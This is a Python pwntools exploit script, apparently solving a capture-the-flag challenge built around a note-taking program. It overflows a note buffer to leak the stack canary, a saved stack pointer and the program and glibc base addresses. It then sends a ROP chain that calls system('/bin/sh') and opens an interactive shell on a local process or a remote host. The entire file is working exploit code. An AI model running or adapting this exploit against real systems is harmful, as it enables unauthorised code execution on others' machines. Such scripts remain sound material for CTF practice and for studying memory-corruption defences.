#!/usr/bin/env python3

from pwn import context, ELF, p64, remote, ROP, sys, u64

context.binary = elf = ELF('chall')
glibc = ELF('libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, port)


S = b's'
M = b'm'
L = b'l'


def create(index: int, size: bytes, text: bytes, date: tuple[int, int, int]):
    io.sendlineafter(b'> ', b'0')
    io.sendlineafter(b'> ', str(index).encode())
    io.sendlineafter(b'Choose note size [(S)mall/(m)edium/(l)arge]: ', size)
    io.sendafter(b'Input your text: ', text)
    io.sendlineafter(b'Keep changes? [y/N]: ', b'y')
    io.sendlineafter(b"Set the note's date (format: dd/mm/yy):\n", '{}/{}/{}'.format(*date).encode())


def view(index: int) -> (list[int], bytes):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'> ', str(index).encode())
    text = b''

    if b'empty' in io.recvline():
        return [], text

    io.recvuntil(b'Date')
    io.recvline()
    io.recvuntil(b'| ')
    date = list(map(int, io.recvuntil(b' ', drop=True).decode().split('/')))
    io.recvuntil(b'Note')
    io.recvline()
    io.recvline()

    while io.recv(2) == b'| ':
        text += io.recvuntil(b'|\n', drop=True).strip()

    return date, text


def edit(index: int, text: bytes, yn: bytes = b'n') -> bytes:
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'> ', str(index).encode())
    return re_edit(text, yn)


def re_edit(text: bytes, yn: bytes = b'n'):
    io.sendafter(b'Input your text: ', text)
    res = io.recvuntil(b'\nKeep changes? [y/N]: ', drop=True)
    io.sendline(yn)

    return res if yn == b'n' else b''


io = get_process()

create(0, L, b'A', (-1, -1, -1))

canary = u64(b'\0' + edit(0, b'A' * 265).split(b'A' * 265)[1][:7])
saved_rbp = u64(re_edit(b'A' * 272).split(b'A' * 272)[1].ljust(8, b'\0'))
elf.address = u64(re_edit(b'A' * 280).split(b'A' * 280)[1].ljust(8, b'\0')) - 0x18c4
glibc.address = u64(re_edit(b'A' * 360).split(b'A' * 360)[1].ljust(8, b'\0')) - 0x2718a

io.success(f'Canary: {hex(canary)}')
io.success(f'ELF base address: {hex(elf.address)}')
io.success(f'Glibc base address: {hex(glibc.address)}')
io.info(f'Stack address: {hex(saved_rbp)}')

rop = ROP(glibc)

payload  = b'A' * 264
payload += p64(canary)
payload += p64(saved_rbp)
payload += p64(rop.ret.address)
payload += p64(rop.rdi.address)
payload += p64(next(glibc.search(b'/bin/sh')))
payload += p64(glibc.sym.system)

re_edit(payload , b'y')

io.interactive()
